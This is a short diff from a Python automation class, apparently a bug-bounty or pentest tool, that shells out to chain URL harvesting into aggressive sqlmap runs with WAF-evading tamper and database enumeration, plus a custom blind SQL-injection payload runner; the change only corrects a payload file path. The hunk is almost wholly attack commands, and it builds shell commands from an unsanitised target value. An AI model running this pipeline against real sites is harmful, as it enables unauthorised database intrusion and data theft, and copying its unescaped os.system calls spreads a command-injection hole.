@@ -190,7 +190,7 @@ class AutomationTool:
         os.system(f"cat {target}-subdomain.txt | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs -threads=5 --random-agent --risk=3 --level=5     --tamper=space2comment -v 3 | tee -a sqli.txt")
         os.system(f"paramspider -l {target}-subdomains_alive.txt")
         os.system(f"cat results/* | sed '/FUZZ//g' > reports/final.txt")
-        os.system(f"python3 {self.TOOLS_DIR}/customBsqli/lostsec.py -l final.txt -p payloads/xor.txt -t 5")
+        os.system(f"python3 {self.TOOLS_DIR}/customBsqli/lostsec.py -l final.txt -p {self.TOOLS_DIR}/customBsqli/payloads/xor.txt -t 5")
 
     def stop(self):
         self._stop_event.set()
